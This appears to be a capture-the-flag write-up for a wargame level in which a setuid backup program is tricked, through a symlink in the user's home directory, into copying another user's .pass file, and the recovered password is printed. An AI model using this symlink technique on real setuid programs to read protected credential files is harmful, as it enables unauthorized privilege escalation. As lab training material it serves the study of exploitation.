In this level we have a simple program that copies the contents of the filename given in argument and put them in the backups/ folder.
Since the program has the setuid bit set it will execute with level09 permissions, so it shouldn't fail while opening it or reading, let's try that:

~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

the opening and reading of .pass seems to be working but there is a problem in writing the backup file because the program writes to "backups/" + filename hence the double slashes, meaning any file outside our home folder will not work.

We can work around that by creating a symlink to the .pass file to place in our home dir:

ln -s /home/users/level09/.pass pass
./level08 pass
cat backups/pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S